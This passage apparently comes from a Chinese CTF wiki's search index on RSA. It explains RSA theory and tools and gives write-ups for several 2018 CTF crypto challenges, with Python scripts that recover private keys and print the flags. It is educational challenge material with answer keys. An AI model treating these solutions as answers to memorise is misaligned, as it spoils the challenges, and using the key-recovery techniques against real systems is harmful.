\u7684\u6c42\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u91cc\u4e5f\u662f\u7b49\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4\uff0c\u76f4\u63a5\u6c42\u89e3\u5373\u53ef\u3002 import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 x2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) flag \u5982\u4e0b \u279c 2018 -\u56fd\u5bb6\u5b89\u5168\u5468\u7b2c\u4e00\u573a-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 } 2018 Pwnhub LHY \u00b6 \u9996\u5148\u5206\u6790\u8fd9\u6bb5\u4ee3\u7801 assert gmpy . is_prime ( y ) ** 2016 + gmpy . is_prime ( x + 1 ) ** 2017 + ( ( x ** 2 - 1 ) ** 2 % ( 2 * x * y - 1 ) + 2 ) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 \u7531\u4e8e gmpy.is_prime \u8981\u4e48\u8fd4\u56de1\uff0c\u8981\u4e48\u8fd4\u56de 0\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8bd5\u51fa\u6765 y \u662f\u7d20\u6570\uff0c x+1 \u4e5f\u662f\u7d20\u6570\uff0c\u5e76\u4e14 (x^2-1)^2\\equiv 0 \\bmod (2xy-1) (x^2-1)^2\\equiv 0 \\bmod (2xy-1) \u4e3a\u4e86\u5f0f\u5b50\u80fd\u591f\u6574\u9664\uff0c\u731c\u6d4b x=2y x=2y \u3002 \u4e8e\u662f\uff0c\u5bf9\u4e8e\u4e0b\u9762\u7684\u5185\u5bb9 p = gmpy . next_prime ( x ** 3 + y ** 3 ) q = gmpy . next_prime ( x ** 2 * y + y ** 2 * x ) n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( 0x10001 , phi ) enc = pow ( bytes_to_long ( flag ), 0x10001 , n ) print 'n =' , n print 'enc =' , enc p p \u548c q q \u81ea\u7136\u4e3a p=next\\_prime(9y^3) p=next\\_prime(9y^3) q=next\\_prime(6y^3) q=next\\_prime(6y^3) \u6839\u636e\u7d20\u6570\u7684\u95f4\u9694\uff0c\u53ef\u4ee5\u77e5\u9053 p p \u548c q q \u6700\u591a\u6bd4\u62ec\u53f7\u91cc\u7684\u6570\u5b57\u5927\u4e00\u70b9\uff0c\u8fd9\u91cc\u4e00\u822c\u4e0d\u4f1a\u8d85\u8fc7 1000 1000 \u3002 \u90a3\u4e48 n \\geq 54y^6 n \\geq 54y^6 \u6240\u4ee5\u6211\u4eec\u77e5\u9053\u4e86 y y \u7684\u4e0a\u754c\uff0c\u800c\u5bf9\u4e8e y y \u7684\u4e0b\u754c\u5176\u5b9e\u4e5f\u4e0d\u4f1a\u79bb\u4e0a\u754c\u592a\u8fdc\uff0c\u6211\u4eec\u5927\u6982\u51cf\u4e2a\u51e0\u5341\u4e07\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u5229\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u5f0f\u6765\u5bfb\u627e p p \u548c q q \uff0c\u5982\u4e0b import gmpy2 tmp = 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 print gmpy2 . iroot ( tmp , 2018 ) print gmpy2 . iroot ( tmp - 1 , 2018 ) print gmpy2 . iroot ( tmp - 2 , 2018 ) n = 260272753019642842691231717156206014402348296256668058656902033827190888150939144319270903947159599144884859205368557385941127216969379550487700198771513118894125094678559478972591331182960004648132846372455712958337042783083099376871113795475285658106058675217077803768944674144803250791799957440111855021945690877200606577646234107957498370758707097662736662439460472126493593605957225541979181422479704018055731221681621886820626215670393536343427267329350730257979042198593215747542270975288047196483958369426727778580292311145109908665004662296440533724591193527886702374790526322791818523938910660223971454070731594803459613066617828657725704376475527288174777197739360634209448477565044519733575375490101670974499385760735451471034271880800081246883157088501597655371430353965493264345172541221268942926210055390568364981514774743693528424196241142665685211916330254113610598390909248626686397970038848966187547231199741 y = 191904757378974300059526915134037747982760255307942501070454569331878491189601823952845623286161325306079772871025816081849039036850918375408172174102720702781463514549851887084613000000 L y = gmpy2 . next_prime ( y ) enc = 73933313646416156737449236838459526871566017180178176765840447023088664788672323530940171469589918772272559607026808711216932468486201094786991159096267208480969757088208089800600731106685561375522764783335332964711981392251568543122418192877756299395774738176188452197889668610818741062203831272066261677731889616150485770623945568369493256759711422067551058418926344060504112146971937651406886327429318390247733970549845424064244469193626197360072341969574784310397213033860597822010667926563087858301337091484951760613299203587677078666096526093414014637559237148644939541419075479462431789925219269815364529507771308181435591670281081465439913711912925412078002618729159141400730636976744132429329651487292506365655834202469178066850282850374067239317928012461993443785247524500680257923687511378073703423047348824611101206633407452837948194591695712958510124436821151767823443033286425729473563002691262316964646014201612 end = gmpy2 . iroot ( n / 54 , 6 )[ 0 ] beg = end - 2000000 mid = 1 while beg < end : mid = ( beg + end ) / 2 if gmpy2 . is_prime ( mid ) != 1 : mid = gmpy2 . next_prime ( mid ) p = gmpy2 . next_prime ( 9 * mid ** 3 ) q = gmpy2 . next_prime ( 6 * mid ** 3 ) n1 = p * q if n1 == n : print p , q phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 0x10001 , phin ) m = gmpy2 . powmod ( enc , d , n ) print hex ( m )[ 2 :] . strip ( 'L' ) . decode ( 'hex' ) print 'ok' exit ( 0 ) elif n1 < n : beg = mid else : end = mid print beg , end","title":"RSA \u4ecb\u7ecd"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa","text":"RSA \u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u79cd\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002\u5728\u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u548c\u7535\u5b50\u5546\u4e1a\u4e2d RSA \u88ab\u5e7f\u6cdb\u4f7f\u7528\u3002RSA \u662f 1977 \u5e74\u7531\u7f57\u7eb3\u5fb7\u00b7\u674e\u7ef4\u65af\u7279\uff08Ron Rivest\uff09\u3001\u963f\u8fea\u00b7\u8428\u83ab\u5c14\uff08Adi Shamir\uff09\u548c\u4f26\u7eb3\u5fb7\u00b7\u963f\u5fb7\u66fc\uff08Leonard Adleman\uff09\u4e00\u8d77\u63d0\u51fa\u7684\u3002RSA \u5c31\u662f\u4ed6\u4eec\u4e09\u4eba\u59d3\u6c0f\u5f00\u5934\u5b57\u6bcd\u62fc\u5728\u4e00\u8d77\u7ec4\u6210\u7684\u3002 RSA \u7b97\u6cd5\u7684\u53ef\u9760\u6027\u7531\u6781\u5927\u6574\u6570\u56e0\u6570\u5206\u89e3\u7684\u96be\u5ea6\u51b3\u5b9a\u3002\u6362\u8a00\u4e4b\uff0c\u5bf9\u4e00\u6781\u5927\u6574\u6570\u505a\u56e0\u6570\u5206\u89e3\u6108\u56f0\u96be\uff0cRSA \u7b97\u6cd5\u6108\u53ef\u9760\u3002\u5047\u5982\u6709\u4eba\u627e\u5230\u4e00\u79cd\u5feb\u901f\u56e0\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u7684\u8bdd\uff0c\u90a3\u4e48\u7528 RSA \u52a0\u5bc6\u7684\u4fe1\u606f\u7684\u53ef\u9760\u6027\u5c31\u80af\u5b9a\u4f1a\u6781\u5ea6\u4e0b\u964d\u3002\u4f46\u627e\u5230\u8fd9\u6837\u7684\u7b97\u6cd5\u7684\u53ef\u80fd\u6027\u662f\u975e\u5e38\u5c0f\u7684\u3002\u5982\u4eca\uff0c\u53ea\u6709\u77ed\u7684 RSA \u5bc6\u94a5\u624d\u53ef\u80fd\u88ab\u5f3a\u529b\u65b9\u5f0f\u89e3\u7834\u3002\u5230 2017 \u5e74\u4e3a\u6b62\uff0c\u8fd8\u6ca1\u6709\u4efb\u4f55\u53ef\u9760\u7684\u653b\u51fb RSA \u7b97\u6cd5\u7684\u65b9\u5f0f\u3002","title":"RSA \u4ecb\u7ecd"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_2","text":"\u968f\u673a\u9009\u62e9\u4e24\u4e2a\u4e0d\u540c\u5927\u8d28\u6570 p p \u548c q q \uff0c\u8ba1\u7b97 N = p \\times q N = p \\times q \u6839\u636e\u6b27\u62c9\u51fd\u6570\uff0c\u6c42\u5f97 \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \u9009\u62e9\u4e00\u4e2a\u5c0f\u4e8e \\varphi (N) \\varphi (N) \u7684\u6574\u6570 e e \uff0c\u4f7f e e \u548c \\varphi (N) \\varphi (N) \u4e92\u8d28\u3002\u5e76\u6c42\u5f97 e e \u5173\u4e8e \\varphi (N) \\varphi (N) \u7684\u6a21\u53cd\u5143\u7d20\uff0c\u547d\u540d\u4e3a d d \uff0c\u6709 ed\\equiv 1 \\pmod {\\varphi (N)} ed\\equiv 1 \\pmod {\\varphi (N)} \u5c06 p\u200b p\u200b \u548c q\u200b q\u200b \u7684\u8bb0\u5f55\u9500\u6bc1 \u6b64\u65f6\uff0c (N,e) (N,e) \u662f\u516c\u94a5\uff0c (N,d) (N,d) \u662f\u79c1\u94a5\u3002","title":"\u516c\u94a5\u4e0e\u79c1\u94a5\u7684\u4ea7\u751f"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_3","text":"\u9996\u5148\u9700\u8981\u5c06\u6d88\u606f \u4ee5\u4e00\u4e2a\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u683c\u5f0f\u8f6c\u5316\u4e3a\u4e00\u4e2a\u5c0f\u4e8e N N \uff0c\u4e14\u4e0e N N \u4e92\u8d28\u7684\u6574\u6570 m m \u3002\u5982\u679c\u6d88\u606f\u592a\u957f\uff0c\u53ef\u4ee5\u5c06\u6d88\u606f\u5206\u4e3a\u51e0\u6bb5\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u6240\u8bf4\u7684\u5757\u52a0\u5bc6\uff0c\u540e\u5bf9\u4e8e\u6bcf\u4e00\u90e8\u5206\u5229\u7528\u5982\u4e0b\u516c\u5f0f\u52a0\u5bc6\uff1a m^{e}\\equiv c\\pmod N m^{e}\\equiv c\\pmod N","title":"\u6d88\u606f\u52a0\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_4","text":"\u5229\u7528\u5bc6\u94a5 d\u200b d\u200b \u8fdb\u884c\u89e3\u5bc6\u3002 c^{d}\\equiv m\\pmod N c^{d}\\equiv m\\pmod N","title":"\u6d88\u606f\u89e3\u5bc6"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_5","text":"\u5373\u6211\u4eec\u8981\u8bc1 m^{ed} \\equiv m \\bmod N m^{ed} \\equiv m \\bmod N \uff0c\u5df2\u77e5 ed \\equiv 1 \\bmod \\phi(N) ed \\equiv 1 \\bmod \\phi(N) \uff0c\u90a3\u4e48 ed=k\\phi(N)+1 ed=k\\phi(N)+1 \uff0c\u5373\u9700\u8981\u8bc1\u660e m^{k\\phi(N)+1} \\equiv m \\bmod N m^{k\\phi(N)+1} \\equiv m \\bmod N \u8fd9\u91cc\u6211\u4eec\u5206\u4e24\u79cd\u60c5\u51b5\u8bc1\u660e \u7b2c\u4e00\u79cd\u60c5\u51b5 gcd(m,N)=1\u200b gcd(m,N)=1\u200b \uff0c\u90a3\u4e48 m^{\\phi(N)} \\equiv 1 \\bmod N\u200b m^{\\phi(N)} \\equiv 1 \\bmod N\u200b \uff0c\u56e0\u6b64\u539f\u5f0f\u6210\u7acb\u3002 \u7b2c\u4e8c\u79cd\u60c5\u51b5 gcd(m,N)\\neq 1 gcd(m,N)\\neq 1 \uff0c\u90a3\u4e48 m m \u5fc5\u7136\u662f p p \u6216\u8005 q q \u7684\u500d\u6570\uff0c\u5e76\u4e14 n=m n=m \u5c0f\u4e8e N N \u3002\u6211\u4eec\u5047\u8bbe m=xp m=xp \u90a3\u4e48 x x \u5fc5\u7136\u5c0f\u4e8e q q \uff0c\u53c8\u7531\u4e8e q q \u662f\u7d20\u6570\u3002\u90a3\u4e48 m^{\\phi(q)} \\equiv 1 \\bmod q m^{\\phi(q)} \\equiv 1 \\bmod q \u8fdb\u800c m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q m^{k\\phi(N)}=m^{k(p-1)(q-1)}=(m^{\\phi(q)})^{k(p-1)} \\equiv 1 \\bmod q \u90a3\u4e48 m^{k\\phi(N)+1}=m+uqm m^{k\\phi(N)+1}=m+uqm \u8fdb\u800c m^{k\\phi(N)+1}=m+uqxp=m+uxN m^{k\\phi(N)+1}=m+uqxp=m+uxN \u6240\u4ee5\u539f\u5f0f\u6210\u7acb\u3002","title":"\u6b63\u786e\u6027\u8bc1\u660e"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_6","text":"","title":"\u57fa\u672c\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsatool","text":"\u5b89\u88c5 git clone https://github.com/ius/rsatool.git cd rsatool python rsatool.py -h \u751f\u6210\u79c1\u94a5 python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321","title":"RSAtool"},{"location":"crypto/asymmetric/rsa/rsa_theory/#rsa-converter","text":"\u6839\u636e\u7ed9\u5b9a\u5bc6\u94a5\u5bf9\uff0c\u751f\u6210 pem \u6587\u4ef6 \u6839\u636e n n \uff0c e e \uff0c d d \u5f97\u51fa p p \uff0c q q","title":"RSA Converter"},{"location":"crypto/asymmetric/rsa/rsa_theory/#openssl","text":"\u67e5\u770b\u516c\u94a5\u6587\u4ef6 openssl rsa -pubin -in pubkey.pem -text -modulus \u89e3\u5bc6 rsautl -decrypt -inkey private.pem -in flag.enc -out flag \u66f4\u52a0\u5177\u4f53\u7684\u7ec6\u8282\u8bf7\u53c2\u8003 openssl --help \u3002","title":"openssl"},{"location":"crypto/asymmetric/rsa/rsa_theory/#_7","text":"\u7f51\u7ad9\u5206\u89e3\uff0c factor.db \u547d\u4ee4\u884c\u5206\u89e3\uff0c factordb-pycli \uff0c\u501f\u7528 factordb \u6570\u636e\u5e93\u3002 yafu","title":"\u5206\u89e3\u6574\u6570\u5de5\u5177"},{"location":"crypto/asymmetric/rsa/rsa_theory/#python","text":"","title":"python \u5e93"},{"location":"crypto/asymmetric/rsa/rsa_theory/#primefac","text":"\u6574\u6570\u5206\u89e3\u5e93\uff0c\u5305\u542b\u4e86\u5f88\u591a\u6574\u6570\u5206\u89e3\u7684\u7b97\u6cd5\u3002","title":"primefac"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy","text":"gmpy.root(a, b) \uff0c\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4 (x, y) \uff0c\u5176\u4e2d x \u4e3a a \u5f00 b \u6b21\u65b9\u7684\u503c\uff0c y \u662f\u5224\u65ad x \u662f\u5426\u4e3a\u6574\u6570\u7684\u5e03\u5c14\u578b\u53d8\u91cf","title":"gmpy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#gmpy2","text":"\u5b89\u88c5\u65f6\uff0c\u53ef\u80fd\u4f1a\u9700\u8981\u81ea\u5df1\u53e6\u884c\u5b89\u88c5 mpfr \u4e0e mpc \u5e93\u3002 gmpy2.iroot(a, b) \uff0c\u7c7b\u4f3c\u4e8e gmpy.root(a,b)","title":"gmpy2"},{"location":"crypto/asymmetric/rsa/rsa_theory/#pycrypto","text":"\u5b89\u88c5 sudo pip install pycrypto \u4f7f\u7528 import gmpy from Crypto.Util.number import * from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 msg = 'crypto here' p = getPrime ( 128 ) q = getPrime ( 128 ) n = p * q e = getPrime ( 64 ) pubkey = RSA . construct (( long ( n ), long ( e ))) privatekey = RSA . construct (( long ( n ), long ( e ), long ( d ), long ( p ), long ( q ))) key = PKCS1_v1_5 . new ( pubkey ) enc = key . encrypt ( msg ) . encode ( 'base64' ) key = PKCS1_v1_5 . new ( privatekey ) msg = key . decrypt ( enc . decode ( 'base64' ), e )","title":"pycrypto"},{"location":"crypto/asymmetric/rsa/rsa_theory/#jarvis-oj-basic-veryeasyrsa","text":"p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 \u6c42 d = \u8bf7\u63d0\u4ea4 PCTF{d} \u76f4\u63a5\u6839\u636e ed\\equiv 1 \\pmod{\\varphi (N)} ed\\equiv 1 \\pmod{\\varphi (N)} \uff0c\u5176\u4e2d \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \\varphi (N)=\\varphi (p)\\varphi (q)=(p-1)(q-1) \uff0c\u53ef\u5f97 d d \u3002 import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phin = ( p - 1 ) * ( q - 1 ) print gmpy2 . invert ( e , phin ) \u279c Jarvis OJ-Basic-veryeasyRSA git: ( master ) \u2717 python exp.py 19178568796155560423675975774142829153827883709027717723363077606260717434369","title":"Jarvis OJ - Basic - veryeasyRSA"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-codegate-ctf-rsababy","text":"\u7a0b\u5e8f\u5c31\u662f\u4e00\u4e2a\u7b80\u5355\u7684 RSA\uff0c\u4e0d\u8fc7\u7a0b\u5e8f\u8fd8\u751f\u6210\u4e86\u4e24\u4e2a\u5947\u602a\u7684\u6570 e = 65537 n = p * q pi_n = ( p - 1 ) * ( q - 1 ) d = mulinv ( e , pi_n ) h = ( d + p ) ^ ( d - p ) g = d * ( p - 0xdeadbeef ) \u6240\u4ee5\uff0c\u95ee\u9898\u5e94\u8be5\u51fa\u81ea\u8fd9\u91cc\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4ece\u6b64\u4e0b\u624b\uff0c\u4e0d\u653e\u8fd9\u91cc\u5148\u5047\u8bbe const = 0xdeadbeef \u3002\u90a3\u4e48 eg = ed * (p-const) eg = ed * (p-const) \u8fdb\u800c\uff0c\u6839\u636e RSA \u53ef\u77e5 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{eg}=2^{ed * (p-const)}=2^{p-const} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n 2^{p-const} * 2^{const-1} = 2^{p-1} \\pmod n \u6240\u4ee5 2^{p-1} = 2^{eg} * 2^{const-1}+kn 2^{p-1} = 2^{eg} * 2^{const-1}+kn \u800c\u4e0e\u6b64\u540c\u65f6\u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\uff0c\u6211\u4eec\u77e5\u9053 2^{p-1} \\equiv 1 \\pmod p 2^{p-1} \\equiv 1 \\pmod p \u6240\u4ee5 p|2^{p-1}-1 | 2^{eg+const-1}-1+kn p|2^{p-1}-1 | 2^{eg+const-1}-1+kn \u8fdb\u800c p|2^{eg+const-1}-1 p|2^{eg+const-1}-1 \u6240\u4ee5 p|gcd(2^{eg+const-1}-1,n) p|gcd(2^{eg+const-1}-1,n) \u56e0\u6b64\uff0c\u4ee3\u7801\u5982\u4e0b tmp = gmpy2 . powmod ( 2 , e * g + const - 1 , n ) - 1 p = gmpy2 . gcd ( tmp , n ) q = n / p phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) plain = gmpy2 . powmod ( data , d , n ) print hex ( plain )[ 2 :] . decode ( 'hex' )","title":"2018 CodeGate CTF Rsababy"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pure-math","text":"\u9898\u76ee\u7684\u57fa\u672c\u63cf\u8ff0\u662f\u8fd9\u4e2a\u6837\u5b50\u7684 1) p ** p % q = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 2) q ** q % p = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 3) (p ** q + q ** p) % (p*q) = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 4) (p+q) ** (p+q) % (p*q) = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 5) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 Now, what\u2019s the FLAG??? \u6211\u4eec\u7684\u76ee\u7684\u57fa\u672c\u4e0a\u5c31\u662f\u6c42\u5f97 FLAG\uff0c\u90a3\u4e48\u600e\u4e48\u505a\u5462?\u8fd9\u4e2a\u9898\u76ee\u9700\u8981\u6211\u4eec\u5177\u6709\u8f83\u597d\u7684\u6570\u8bba\u529f\u5e95\u3002 \u6839\u636e\u9898\u76ee\u4e2d\u8fd9\u6837\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe p p \uff0c q q \u90fd\u662f\u5927\u7d20\u6570\uff0c\u90a3\u4e48 p^{q-1} \\equiv 1\\bmod q p^{q-1} \\equiv 1\\bmod q \u90a3\u4e48 p^{q} \\equiv p \\bmod pq p^{q} \\equiv p \\bmod pq \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e 3\uff09\u77e5\u9053 p^q+q^p \\equiv p+q \\bmod pq p^q+q^p \\equiv p+q \\bmod pq \u800c p+q p+q \u53c8\u663e\u7136\u5c0f\u4e8e pq pq \uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u77e5\u9053 p+q p+q \u7684\u6570\u503c\u3002 \u8fdb\u4e00\u6b65\uff0c\u6211\u4eec\u5047\u8bbe1\uff09\uff0c2\uff09\uff0c3\uff09\uff0c4\uff09\uff0c5\uff09\u5bf9\u5e94\u7684\u503c\u5206\u522b\u4e3a x_1 x_1 , x_2 x_2 , x_3 x_3 , x_4 x_4 , x_5 x_5 \u5219 \u6839\u636e4\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq (p+q)^{p+q} \\equiv p^{p+q}+q^{p+q} \\bmod pq \u53c8\u56e0\u4e3a1\uff09\u548c 2\uff09\uff0c\u5219 p^pp \\equiv px_1\\bmod pq p^pp \\equiv px_1\\bmod pq q^qq \\equiv qx_2 \\bmod pq q^qq \\equiv qx_2 \\bmod pq \u56e0\u6b64 px_1+qx_2 \\equiv x_4 \\bmod pq px_1+qx_2 \\equiv x_4 \\bmod pq \u6839\u636e x_1 x_1 \u548c x_2 x_2 \u7684\u6c42\u5f97\u65b9\u5f0f\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u8fd9\u91cc\u4e5f\u662f\u7b49\u53f7\uff0c\u56e0\u6b64\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u4e8c\u5143\u4e00\u6b21\u65b9\u7a0b\u7ec4\uff0c\u76f4\u63a5\u6c42\u89e3\u5373\u53ef\u3002 import gmpy2 x1 = 1137973316343089029387365135250835133803975869258714714790597743585251681751361684698632609164883988455302237641489036138661596754239799122081528662395492 x2 = 6901383184477756324584651464895743132603115552606852729050186289748558760692261058141015199261946483809004373728135568483701274908717004197776113227815323 p_q = 16791287391494893024031688699360885996180880807427715700800644759680986120242383930558410147341340225420991368114858791447699399702390358184412301644459406 x4 = 63112211860889153729003401381621068190906433969243079543438386686621389392583849748240273643614258173423474299387234175508649197780206757067354426424570586101908571600743792328163163458500138799976944702155779196849585083397395750018148652864158388247163109077215394538930498877175474225571393901460434679279 if ( x4 - x1 * p_q ) % ( x2 - x1 ) == 0 : print 'True' q = ( x4 - x1 * p_q ) / ( x2 - x1 ) print q p = p_q - q c = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030 phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( 31337 , phin ) flag = gmpy2 . powmod ( c , d , p * q ) flag = hex ( flag )[ 2 :] print flag . decode ( 'hex' ) flag \u5982\u4e0b \u279c 2018 -\u56fd\u5bb6\u5b89\u5168\u5468\u7b2c\u4e00\u573a-puremath git: ( master ) \u2717 python exp.py True 7635093784603905632817000902311635311970645531806863592697496927519352405158721310359124595712780726701027634372170535318453656286180828724079479352052417 flag { 6a66b8d5-6047-4299-a48e-4c4d1f874d12 }","title":"2018 \u56fd\u5bb6\u5b89\u5168\u5468 pure math"},{"location":"crypto/asymmetric/rsa/rsa_theory/#2018-pwnhub-lhy","text":"\u9996\u5148\u5206\u6790\u8fd9\u6bb5\u4ee3\u7801 assert gmpy . is_prime ( y ) ** 2016 + gmpy . is_prime ( x + 1 ) ** 2017 + ( ( x ** 2 - 1 ) ** 2 % ( 2 * x * y - 1 ) + 2 ) ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 \u7531\u4e8e gmpy.is_prime \u8981\u4e48\u8fd4\u56de1\uff0c\u8981\u4e48\u8fd4\u56de 0\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8bd5\u51fa\u6765 y \u662f\u7d20\u6570\uff0c x+1 \u4e5f\u662f\u7d20\u6570\uff0c\u5e76\u4e14 (x^2-1)^2\\equiv 0 \\bmod (2xy-1) (x^2-1)^2\\equiv 0 \\bmod (2xy-1) \u4e3a\u4e86\u5f0f\u5b50\u80fd\u591f\u6574\u9664\uff0c\u731c\u6d4b x=2y x=2y \u3002 \u4e8e\u662f\uff0c\u5bf9\u4e8e\u4e0b\u9762\u7684\u5185\u5bb9 p = gmpy . next_prime ( x ** 3 + y ** 3 ) q = gmpy . next_prime ( x ** 2 * y + y ** 2 * x ) n = p * q phi = ( p - 1 ) * ( q - 1 ) d = gmpy . invert ( 0x10001 , phi ) enc = pow ( bytes_to_long ( flag ), 0x10001 , n ) print 'n =' , n print 'enc =' , enc p p \u548c q q \u81ea\u7136\u4e3a p=next\\_prime(9y^3) p=next\\_prime(9y^3) q=next\\_prime(6y^3) q=next\\_prime(6y^3) \u6839\u636e\u7d20\u6570\u7684\u95f4\u9694\uff0c\u53ef\u4ee5\u77e5\u9053 p p \u548c q q \u6700\u591a\u6bd4\u62ec\u53f7\u91cc\u7684\u6570\u5b57\u5927\u4e00\u70b9\uff0c\u8fd9\u91cc\u4e00\u822c\u4e0d\u4f1a\u8d85\u8fc7 1000 1000 \u3002 \u90a3\u4e48 n \\geq 54y^6 n \\geq 54y^6 \u6240\u4ee5\u6211\u4eec\u77e5\u9053\u4e86 y y \u7684\u4e0a\u754c\uff0c\u800c\u5bf9\u4e8e y y \u7684\u4e0b\u754c\u5176\u5b9e\u4e5f\u4e0d\u4f1a\u79bb\u4e0a\u754c\u592a\u8fdc\uff0c\u6211\u4eec\u5927\u6982\u51cf\u4e2a\u51e0\u5341\u4e07\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u5229\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u5f0f\u6765\u5bfb\u627e p p \u548c q q 